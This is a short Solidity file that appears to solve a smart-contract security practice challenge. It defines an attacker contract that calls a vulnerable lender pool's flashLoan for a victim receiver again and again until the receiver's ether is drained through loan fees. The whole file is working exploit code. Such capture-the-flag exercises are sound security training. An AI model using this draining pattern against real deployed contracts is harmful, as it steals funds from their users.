// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract FlashLoanReceiverAttacker {
    NaiveReceiverLenderPool public pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address _receiver) external {
        while (payable(_receiver).balance >= 1 ether) {
            pool.flashLoan(_receiver, 0);
        }
    }
}
